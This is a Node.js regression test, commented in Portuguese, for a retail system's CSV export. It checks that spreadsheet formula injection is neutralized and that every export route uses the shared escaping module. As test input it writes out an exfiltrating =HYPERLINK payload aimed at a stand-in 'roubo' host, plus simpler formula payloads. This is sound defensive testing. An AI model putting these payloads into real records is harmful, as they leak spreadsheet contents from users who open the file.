#!/usr/bin/env node
/**
 * EXPORTAÇÃO CSV — o arquivo não pode virar programa (fase DA).
 *
 * O DEFEITO. O escape do CSV cuidava de aspas, ponto e vírgula e quebra de
 * linha — tudo que o FORMATO exige — e não de quem ABRE o arquivo. Excel e
 * LibreOffice avaliam como fórmula toda célula que começa com `=`, `+`, `-`,
 * `@`, TAB ou CR.
 *
 * Medido em 25/09/2026, com um cliente chamado `=1+1` e um produto chamado
 * `=HYPERLINK("http://exemplo.invalido/roubo?d="&A1,"Clique")`:
 *
 *   ...;V;=1+1;"=HYPERLINK(""http://exemplo.invalido/roubo?d=""&A1,""Clique"")";@SUM(A1:A9);...
 *
 * As quatro células saíram VIVAS. A do HYPERLINK é a que importa: ela monta uma
 * URL com o conteúdo da planilha dentro e manda para fora quando alguém clica.
 * Aspas não protegem — o Excel avalia fórmula dentro de campo entre aspas
 * também, e foi por isso que aquela célula, escapada corretamente, continuava
 * perigosa.
 *
 * E o caminho é curto: o nome vem do cadastro, 6.492 pessoas entraram por
 * importação do ViperERP, e quem abre o arquivo é o dono ou o gerente de loja,
 * no Windows, com Excel. Não precisa de invasão — basta um cadastro com nome
 * esquisito.
 *
 * O QUE ESTE TESTE PROTEGE, E POR QUE CADA COISA
 * ---------------------------------------------
 * 1. OS QUATRO CARACTERES, e os dois esquecidos (TAB e CR). Proteger três de
 *    quatro é pior do que não proteger nenhum: passa a impressão de que o
 *    buraco está fechado.
 * 2. DENTRO DAS ASPAS TAMBÉM. O apóstrofo tem de ficar DENTRO do campo entre
 *    aspas; fora (`'"=..."`), não é campo válido e o leitor veria o apóstrofo
 *    como conteúdo e as aspas como começo de outro campo.
 * 3. NÚMERO NÃO LEVA APÓSTROFO. Com ele, a planilha trata o valor como texto e
 *    a soma da coluna dá zero — trocaria um problema de segurança por um de
 *    contabilidade. É por isso que quem chama separa as colunas por tipo.
 * 4. O FORMATO CONTINUA O QUE ERA: `;` (Excel em português), BOM (acento), CRLF
 *    (RFC 4180) e aspas dobradas.
 * 5. A REGRA TEM UM DONO SÓ. O documento de BI pede exportação nos ~20
 *    relatórios; hoje só dois dos quatro exportam. O próximo `celula()` escrito
 *    à mão nasceria sem a neutralização, porque essa parte não é óbvia olhando
 *    o código do primeiro.
 */
const fs = require('fs');
const path = require('path');

const RAIZ = path.join(__dirname, '..');
const ler = (rel) => fs.readFileSync(path.join(RAIZ, rel), 'utf8');
const { semComentarios } = require('./sem-comentarios');

const csv = require(path.join(RAIZ, 'lib/csv'));
const rv = require(path.join(RAIZ, 'lib/relatorios-vendas'));

let falhas = 0;
const check = (nome, cond, det) => {
  console.log(`  ${cond ? 'OK  ' : 'XX  '} ${nome}${det !== undefined ? ' -> ' + det : ''}`);
  if (!cond) falhas++;
};

// ---------------------------------------------------------------------------
console.log('--- 1. os seis inícios de fórmula são neutralizados ---');
// TAB e CR entram porque o Excel os ignora antes de decidir se o que vem depois
// é fórmula: `\t=1+1` roda igual.
for (const [rotulo, entrada] of [
  ['=', '=1+1'],
  ['+', '+1'],
  ['-', '-2+3'],
  ['@', '@SUM(A1:A9)'],
  ['TAB', '\t=1+1'],
  ['CR', '\r=1+1']
]) {
  const saida = csv.celula(entrada);
  // Depois da neutralização, o primeiro caractere do CAMPO (fora das aspas, se
  // houver) tem de ser o apóstrofo.
  const conteudo = saida.startsWith('"') ? saida.slice(1, -1) : saida;
  check(`"${rotulo}" ganha apóstrofo`, conteudo.startsWith("'"), JSON.stringify(saida));
}
check('o regex está exportado, para quem escrever outro export conferir',
  csv.INICIO_DE_FORMULA instanceof RegExp);

console.log('\n--- 2. dentro das aspas, não fora ---');
// O payload real: precisa de aspas (tem `"` dentro) E de neutralização.
const hyperlink = csv.celula('=HYPERLINK("http://exemplo.invalido/roubo?d="&A1,"Clique")');
check('o campo é citado', hyperlink.startsWith('"') && hyperlink.endsWith('"'));
check('  e o apóstrofo está DENTRO das aspas', hyperlink.startsWith('"\''),
  hyperlink.slice(0, 16) + '...');
check('  com as aspas internas dobradas', hyperlink.includes('""http://'));
// A armadilha: `'"=..."` não é campo válido.
check('  e NÃO começa com apóstrofo fora das aspas', !hyperlink.startsWith('\'"'));

console.log('\n--- 3. texto comum não é tocado ---');
check('nome normal passa igual', csv.celula('Bicicleta Aro 29') === 'Bicicleta Aro 29');
check('vazio vira vazio', csv.celula('') === '');
check('null e undefined viram vazio', csv.celula(null) === '' && csv.celula(undefined) === '');
check('ponto e vírgula obriga aspas', csv.celula('A; B') === '"A; B"');
check('quebra de linha obriga aspas', csv.celula('A\nB') === '"A\nB"');
// CR sozinho também quebra a linha do arquivo, e antes não estava na lista de
// caracteres que obrigam aspas — só \n estava.
check('CR também obriga aspas', csv.celula('A\rB').startsWith('"'), JSON.stringify(csv.celula('A\rB')));
check('acento passa igual', csv.celula('Ônix') === 'Ônix');

console.log('\n--- 4. número não leva apóstrofo ---');
// Apóstrofo aqui faria a planilha tratar como texto e a soma dar zero.
check('negativo mantém o sinal', csv.numero(-2, 2) === '-2,00', csv.numero(-2, 2));
check('  sem apóstrofo', !csv.numero(-2, 2).startsWith("'"));
check('vírgula decimal', csv.numero(10, 2) === '10,00');
check('sem casas fixas quando não se pede', csv.numero(1.5) === '1,5', csv.numero(1.5));
check('valor inválido vira zero, não NaN', csv.numero('abc', 2) === '0,00', csv.numero('abc', 2));

console.log('\n--- 5. juntar NÃO escapa (e o nome diz isso) ---');
// A primeira versão chamava-se `linha` e aplicava `celula` em cada valor, com
// quem chama aplicando também: texto escapado duas vezes, e o número formatado
// ganhando apóstrofo.
check('juntar só coloca o ponto e vírgula', csv.juntar(['a', 'b']) === 'a;b');
check('  e não existe mais `linha` escapando por trás', csv.linha === undefined);
check('documento leva BOM', csv.documento(['A'], []).startsWith('\ufeff'));
check('  e CRLF', csv.documento(['A'], [['x']]).includes('\r\n'));
check('  e escapa o CABEÇALHO', csv.documento(['A;B'], []).includes('"A;B"'),
  'rotulo com ponto e virgula quebraria o arquivo igual');

console.log('\n--- 6. o relatório de vendas, ponta a ponta ---');
const linhaEnvenenada = {
  data: '2026-09-25', pedidoCodigo: '1', vendedorNome: 'V',
  clienteNome: '=1+1',
  produtoNome: '=HYPERLINK("http://exemplo.invalido/roubo?d="&A1,"Clique")',
  produtoCodigo: '@SUM(A1:A9)',
  quantidade: 1.5, valorUnitario: 10, desconto: -2, valorTotal: 13,
  statusRotulo: '+1'
};
const arquivo = rv.montarCsv([linhaEnvenenada]);
const celulas = arquivo.split('\r\n')[1].split(';');
check('o cliente saiu neutralizado', celulas[3] === "'=1+1", celulas[3]);
check('o produto também, dentro das aspas', celulas[4].startsWith('"\'=HYPERLINK'), celulas[4].slice(0, 20));
check('o código do produto também', celulas[5] === "'@SUM(A1:A9)", celulas[5]);
check('e o status', celulas[10] === "'+1", celulas[10]);
// As colunas numéricas atravessam intactas: é o que garante que a planilha
// ainda soma.
check('quantidade intacta', celulas[6] === '1,5', celulas[6]);
check('valor unitário intacto', celulas[7] === '10,00', celulas[7]);
check('desconto negativo intacto', celulas[8] === '-2,00', celulas[8]);
check('total intacto', celulas[9] === '13,00', celulas[9]);
check('nenhuma célula viva sobrou na linha',
  celulas.every((c) => !csv.INICIO_DE_FORMULA.test(c.startsWith('"') ? c.slice(1) : c)
    || /^-?\d/.test(c)),
  'numero comeca com - e e legitimo; o resto nao pode comecar com = + - @');

console.log('\n--- 7. a regra tem um dono ---');
const relatorio = semComentarios(ler('lib/relatorios-vendas.js'));
check('o relatório requer lib/csv', /require\('\.\/csv'\)/.test(ler('lib/relatorios-vendas.js')));
check('e delega o documento', /return csv\.documento\(COLUNAS_CSV\.map/.test(relatorio));
// O CHECK QUE IMPEDE A SEGUNDA CÓPIA. Se alguém reescrever o escape aqui, ou
// num export novo, este é o que falha.
check('o relatório NÃO tem mais o seu próprio escape',
  !/\/\[;"\\n\]\/\.test/.test(relatorio) && !/replace\(\/"\/g, '""'\)/.test(relatorio),
  'era o `celula` local, que cuidava do formato e nao de quem abre');
check('  nem a sua própria vírgula decimal',
  !/replace\('\.', ','\)/.test(relatorio));

// TODA ROTA QUE EMITE text/csv MONTA O ARQUIVO POR UM MÓDULO, e nenhuma o monta
// sozinha. O documento de BI pede exportação em ~20 relatórios, e é esse
// crescimento que este check vigia.
//
// A primeira versão exigia `rotasCsv === 1`, e falhou no dia seguinte quando a
// fase DB deu exportação ao Financeiro e ao Estoque — fez o que tinha de fazer
// (avisar que nasceu outra) e pela razão errada (contar rotas não é a regra). A
// regra é: cada uma passa por um montador, e o montador passa por lib/csv.js.
const servidorInteiro = semComentarios(ler('server.js'));
// O `text/csv` DOS RELATÓRIOS MORA EM enviarCsv (06/10/2026): os exports
// passaram a mandar o arquivo comprimido, por uma função só, e o cabeçalho
// saiu de cada rota. Então a "rota de CSV" é cada CHAMADA de enviarCsv — e o
// corpo da função em si sai da busca, para o `text/csv` dela não contar como
// uma rota sem montador. Rota que escreva `text/csv` por conta própria
// continua sendo achada pela busca de sempre.
//
// TODA CHAMADA CONTA, com ou sem `return` antes (07/10/2026). A primeira
// versão só contava `return enviarCsv(res, `, e uma rota escrita como
// `enviarCsv(res, linhas.join(';'), 'x.csv'); return;` escapava da conferência
// do montador abaixo — exatamente o buraco que ela vigia. E a troca vale para
// o arquivo INTEIRO: antes ela só pegava o trecho depois da definição (o
// `.replace` estava preso à segunda metade), e uma chamada escrita mais acima
// no server.js também escapava.
const inicioEnviar = servidorInteiro.indexOf('function enviarCsv(');
const servidor = (inicioEnviar < 0 ? servidorInteiro
  : servidorInteiro.slice(0, inicioEnviar) + servidorInteiro.slice(servidorInteiro.indexOf('\n  }\n', inicioEnviar)))
  .replace(/\benviarCsv\(res,/g, "'text/csv'; enviarCsv(res,");
const rotasCsv = (servidor.match(/text\/csv/g) || []).length;
// O catálogo de relatórios (lib/relatorios) monta TODOS os seus arquivos por
// um só montador, motorDeRelatorios.paraCsv — conferido no fim deste teste.
const MONTADOR = /relatoriosVendas\.montarCsv\(|relatoriosCsv\.(financeiro|estoque)\(|motorDeRelatorios\.paraCsv\(/;
const montagens = (servidor.match(new RegExp(MONTADOR.source, 'g')) || []).length;
check(`toda rota de CSV chama um montador (${rotasCsv} rota(s), ${montagens} montagem(ns))`,
  rotasCsv > 0 && montagens >= rotasCsv,
  'rota nova sem montador cai aqui');
// O CHECK QUE IMPEDE A MONTAGEM À MÃO — e olha o CORPO de cada rota de CSV, não
// o arquivo inteiro. `!/join\(';'\)/` no server.js todo reprovava
// `buildNfeConteudoKey`, que junta itens com ponto e vírgula para a chave de
// idempotência da NF-e e não tem nada a ver com planilha. Guarda que reprova
// código correto é guarda que alguém desliga.
const corposDeCsv = [];
let de = servidor.indexOf('text/csv');
while (de >= 0) {
  corposDeCsv.push(servidor.slice(Math.max(0, de - 2000), de));
  de = servidor.indexOf('text/csv', de + 1);
}
check(`achei o corpo das ${corposDeCsv.length} rota(s) de CSV`, corposDeCsv.length === rotasCsv);
check('cada uma chama um montador, e nenhuma junta células por conta própria',
  corposDeCsv.every((corpo) => MONTADOR.test(corpo) && !/join\(';'\)/.test(corpo)),
  'montar a mao e o caminho de volta para o buraco da fase DA');

// Os montadores do Financeiro e do Estoque passam por lib/csv.js — se um deles
// escrever o separador direto, a neutralização não acontece naquele arquivo.
const outros = semComentarios(ler('lib/relatorios-csv.js'));
check('relatorios-csv requer lib/csv', /require\('\.\/csv'\)/.test(ler('lib/relatorios-csv.js')));
check('  e monta os dois documentos por ele',
  (outros.match(/csv\.documento\(/g) || []).length === 2);
check('  sem join manual', !/\.join\(';'\)/.test(outros));
// Texto pelo `celula` (neutraliza), número pelo `numero` (não neutraliza, senão
// a planilha pararia de somar a coluna).
check('  texto pelo celula e número pelo numero',
  /csv\.celula\(texto\(/.test(outros) && /csv\.numero\(/.test(outros));

// O MOTOR DO CATÁLOGO, e um arquivo de verdade passando por ele: texto
// perigoso neutralizado, número intacto, total no fim.
const motorSrc = semComentarios(ler('lib/relatorios/motor.js'));
check('o motor do catálogo requer lib/csv', /require\('\.\.\/csv'\)/.test(ler('lib/relatorios/motor.js')));
check('  monta o documento por ele, sem join manual', /csv\.documento\(/.test(motorSrc) && !/\.join\(';'\)/.test(motorSrc));
const motor = require('../lib/relatorios/motor');
const arquivoDoMotor = motor.paraCsv({
  key: 'x', titulo: 'X', filtros: { hoje: '2026-10-02' },
  colunas: [{ campo: 'nome', rotulo: 'Nome', tipo: 'texto' }, { campo: 'valor', rotulo: 'Valor', tipo: 'moeda' }],
  linhas: [{ nome: '=HYPERLINK("http://x")', valor: -10 }],
  totais: { valor: -10 }
});
check('  texto perigoso sai neutralizado', arquivoDoMotor.includes(`"'=HYPERLINK(""http://x"")"`), arquivoDoMotor.split('\r\n')[1]);
check('  número negativo sai intacto', /;-10,00\r\n/.test(arquivoDoMotor));
check('  e a linha de total fecha o arquivo', /Total;-10,00\r\n$/.test(arquivoDoMotor));

console.log(falhas ? `\n===== ${falhas} FALHA(S) =====` : '\n===== TODOS OS CHECKS PASSARAM =====');
process.exit(falhas ? 1 : 0);
